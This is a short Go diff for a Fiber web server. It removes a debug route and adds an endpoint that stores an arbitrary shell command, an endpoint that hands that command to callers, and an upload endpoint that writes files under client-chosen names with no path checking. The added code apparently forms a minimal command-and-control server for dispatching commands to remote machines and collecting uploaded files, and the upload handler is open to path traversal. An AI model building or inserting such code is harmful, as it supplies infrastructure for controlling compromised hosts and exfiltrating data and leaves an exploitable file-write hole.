@@ -1,13 +1,26 @@
 package main
 
-import "github.com/gofiber/fiber/v2"
+import (
+	"fmt"
+	"github.com/gofiber/fiber/v2"
+)
 
 func main() {
+	responsecmd := "ls -al"
 	app := fiber.New()
 
-	app.Get("/", GetBasicDebug)
-	app.Get("/test", func(ctx *fiber.Ctx) error {
-		return ctx.SendString("FakeResponse")
+	app.Post("/", func(ctx *fiber.Ctx) error {
+		file, _ := ctx.FormFile("index.html")
+
+		return ctx.SaveFile(file, fmt.Sprintf("./%s", file.Filename))
+	})
+	app.Get("/getcmd", func(ctx *fiber.Ctx) error {
+		return ctx.SendString(responsecmd)
+	})
+
+	app.Get("/postcommand", func(ctx *fiber.Ctx) error {
+		responsecmd = ctx.FormValue("command")
+		return ctx.SendString(responsecmd)
 	})
 
 	app.Listen(":80")
